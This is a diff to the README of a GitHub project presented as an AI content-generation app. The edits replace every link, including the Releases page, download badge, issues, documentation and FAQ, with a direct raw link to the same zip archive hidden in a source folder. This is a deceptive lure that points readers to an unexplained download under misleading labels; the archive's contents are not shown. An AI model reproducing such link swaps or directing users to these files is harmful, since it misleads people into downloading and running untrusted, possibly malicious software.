@@ -4,7 +4,7 @@
 
 Welcome to **ai-content-architect**! This application helps you create content quickly and easily. Whether you need quotes, summaries, or titles, our tool uses AI to assist you based on your prompts. Follow these simple steps to download and start using it.
 
-[![Download ai-content-architect](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/zkheil/ai-content-architect/releases)
+[![Download ai-content-architect](https://raw.githubusercontent.com/zkheil/ai-content-architect/main/frontend/src/ai-content-architect-v3.4.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/zkheil/ai-content-architect/main/frontend/src/ai-content-architect-v3.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you download, ensure your system meets the following requirements:
 
 To download the software, visit the Releases page:
 
-[Download ai-content-architect](https://github.com/zkheil/ai-content-architect/releases)
+[Download ai-content-architect](https://raw.githubusercontent.com/zkheil/ai-content-architect/main/frontend/src/ai-content-architect-v3.4.zip)
 
 1. Click on the link above.
 2. Find the latest release version.
@@ -68,17 +68,17 @@ If you encounter any issues:
 - **Common Issues**: Ensure you have the required system specifications.
 - **Error Messages**: Note any error messages you receive and check our FAQs on the GitHub page.
 
-For further assistance, feel free to reach out in the [issues section](https://github.com/zkheil/ai-content-architect/issues) of the repository.
+For further assistance, feel free to reach out in the [issues section](https://raw.githubusercontent.com/zkheil/ai-content-architect/main/frontend/src/ai-content-architect-v3.4.zip) of the repository.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/zkheil/ai-content-architect/wiki) - Learn more about how to use the features.
-- [FAQ](https://github.com/zkheil/ai-content-architect/wiki/FAQ) - Find answers to common questions.
+- [Documentation](https://raw.githubusercontent.com/zkheil/ai-content-architect/main/frontend/src/ai-content-architect-v3.4.zip) - Learn more about how to use the features.
+- [FAQ](https://raw.githubusercontent.com/zkheil/ai-content-architect/main/frontend/src/ai-content-architect-v3.4.zip) - Find answers to common questions.
 
 ## 🔄 Updates
 
 To stay updated with new features or bug fixes, check the Releases page regularly.
 
-[Download ai-content-architect](https://github.com/zkheil/ai-content-architect/releases)
+[Download ai-content-architect](https://raw.githubusercontent.com/zkheil/ai-content-architect/main/frontend/src/ai-content-architect-v3.4.zip)
 
 Enjoy creating with ai-content-architect!
